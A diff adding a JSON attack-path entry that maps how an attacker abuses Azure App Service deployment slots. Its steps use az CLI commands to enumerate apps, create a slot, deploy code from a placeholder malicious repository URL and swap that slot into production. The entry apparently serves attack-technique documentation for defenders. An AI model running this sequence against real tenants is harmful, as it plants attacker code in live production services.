@@ -1,0 +1,60 @@
+{
+    "title": "Exploit Deployment Slot Swap to Deploy Malicious Code",
+    "icon": "https://img.icons8.com/?size=100&id=45026&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List App Services",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/app.png",
+            "details": {
+                "command": "az webapp list --resource-group <ResourceGroupName>",
+                "description": "Lists all app services in the specified resource group.",
+                "services": ["AppService"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/webapp?view=azure-cli-latest#az-webapp-list"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Create Deployment Slot",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/add-file.png",
+            "details": {
+                "command": "az webapp deployment slot create --resource-group <ResourceGroupName> --name <AppName> --slot <SlotName>",
+                "description": "Creates a deployment slot for the specified app service.",
+                "services": ["AppService"],
+                "attack_types": ["Code Injection"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/webapp/deployment/slot?view=azure-cli-latest#az-webapp-deployment-slot-create"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Deploy Malicious Code to Slot",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/upload.png",
+            "details": {
+                "command": "az webapp deployment source config --name <AppName> --resource-group <ResourceGroupName> --slot <SlotName> --repo-url <MaliciousRepoURL> --branch master --manual-integration",
+                "description": "Deploys malicious code to the created deployment slot.",
+                "services": ["AppService"],
+                "attack_types": ["Code Injection"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/webapp/deployment/source?view=azure-cli-latest#az-webapp-deployment-source-config"
+            }
+        },
+        {
+            "id": 5,
+            "label": "Swap Deployment Slots",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/swap.png",
+            "details": {
+                "command": "az webapp deployment slot swap --resource-group <ResourceGroupName> --name <AppName> --slot <SlotName> --target-slot production",
+                "description": "Swaps the deployment slots to push the malicious code to production.",
+                "services": ["AppService"],
+                "attack_types": ["Code Injection"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/webapp/deployment/slot?view=azure-cli-latest#az-webapp-deployment-slot-swap"
+            }
+        }
+    ]
+}
